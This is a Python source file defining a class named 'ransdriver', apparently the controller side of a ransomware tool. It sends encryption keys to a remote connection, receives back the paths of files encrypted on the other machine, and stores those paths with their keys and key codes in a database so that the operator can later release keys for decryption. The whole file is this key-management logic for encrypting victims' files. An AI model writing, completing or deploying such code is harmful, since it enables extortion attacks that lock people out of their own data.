#-------------------------------------- CLASS AND FUNCTIONS

class ransdriver:
    def __init__(self, *, connection_manager, database_manager, prompt_manager):
        self._connection_manager = connection_manager
        self._database_manager = database_manager
        self._prompt_manager = prompt_manager
        self.__done_message = 'DONE'.encode('utf-8')
    
    def Encrypt(self, arguments:dict):
        """
        Try to analyze the encrypt
        command arguments and run them
        """
        self._prompt_manager.make_table('Encrypting', ('Key Code', 'File Path', 'Encryption Key'))
        
        path = key = key_code = ''.encode('utf-8')
        
        if 'kf' in arguments:
            for file in arguments['kf']:
                with open(file, 'rb') as key_file:
                    for key in key_file:
                        key = key.strip('\n'.encode('utf-8'))
                        self._connection_manager.send({'KEY': key})
                        path = self._connection_manager.receive_data('SENT_PATH')
                        key = self._connection_manager.receive_data('SENT_KEY')
                        key_code = self._connection_manager.receive_data('SENT_CODE')
                        if path == key == key_code == self.__done_message:
                            break
                        self._database_manager.write_data(file_path=path, key=key, key_code=int(key_code.decode('utf-8')))
                        self._prompt_manager.add_to_table(key_code.decode('utf-8'), path.decode('utf-8'), key.decode('utf-8'))
                if path == key == key_code == self.__done_message:
                    break
            else:
                self._connection_manager.send({'KEY': self.__done_message})
        
        while not (path == key == key_code == self.__done_message):
            path = self._connection_manager.receive_data('SENT_PATH')
            key = self._connection_manager.receive_data('SENT_KEY')
            key_code = self._connection_manager.receive_data('SENT_CODE')
            if path == key == key_code == self.__done_message:
                break
            self._database_manager.write_data(file_path=path, key=key, key_code=int(key_code.decode('utf-8')))
            self._prompt_manager.add_to_table(key_code.decode('utf-8'), path.decode('utf-8'), key.decode('utf-8'))
        self._prompt_manager.stop_live()
    
    def Decrypt(self, arguments:dict):
        """
        Try to analyze the decrypt
        command arguments and run them
        """
        self._prompt_manager.make_table('Decrypting', ('Key Code', 'File Path', 'Encryption Key', 'Status'))
        while True:
            status = 'Uncertain'.encode('utf-8')
            key = ''.encode()
            key_code = self._connection_manager.receive_data('SENT_CODE')
            if key_code:
                key = self._database_manager.read_data(int(key_code))
                self._connection_manager.send({'KEY': key})
                status = self._connection_manager.receive_data('SENT_STATUS')
            path = self._connection_manager.receive_data('SENT_PATH')
            if path == self.__done_message:
                break
            self._prompt_manager.add_to_table(key_code.decode('utf-8'), path.decode('utf-8'), key.decode('utf-8'), status.decode('utf-8'))
        self._prompt_manager.stop_live()
